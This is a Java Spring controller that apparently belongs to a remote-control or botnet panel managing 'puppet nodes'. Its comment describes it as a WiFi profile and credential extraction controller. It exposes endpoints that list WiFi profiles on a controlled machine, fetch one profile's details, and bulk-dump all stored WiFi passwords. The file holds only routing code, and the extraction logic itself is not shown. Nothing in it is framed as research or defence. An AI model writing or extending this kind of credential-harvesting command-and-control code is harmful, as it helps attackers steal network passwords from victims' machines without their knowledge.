package org.leo.web.controller.puppetnode.service;

import org.leo.core.util.ApiResponse;
import org.leo.web.util.ControllerUtil;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;

/**
 * WiFi 配置文件和凭据提取控制器
 */
@RestController
@RequestMapping("/puppet-node/wifi-profile")
public class WifiProfileController {

    @RequestMapping(value = "/list", method = RequestMethod.POST)
    public HashMap<String, Object> listProfiles(@RequestBody HashMap<String, Object> params) {
        return ControllerUtil.handlePuppetCall(params, "列出 WiFi 配置失败", node -> node.listWifiProfiles());
    }

    @RequestMapping(value = "/detail", method = RequestMethod.POST)
    public HashMap<String, Object> profileDetail(@RequestBody HashMap<String, Object> params) {
        String profileName = ControllerUtil.getStr(params, "profileName");
        if (profileName == null) {
            return ApiResponse.error("profileName 参数不能为空");
        }
        return ControllerUtil.handlePuppetCall(params, "获取 WiFi 详情失败", node -> node.getWifiProfileDetail(profileName));
    }

    @RequestMapping(value = "/dump-all", method = RequestMethod.POST)
    public HashMap<String, Object> dumpAllPasswords(@RequestBody HashMap<String, Object> params) {
        return ControllerUtil.handlePuppetCall(params, "批量提取 WiFi 密码失败", node -> node.dumpAllWifiPasswords());
    }
}
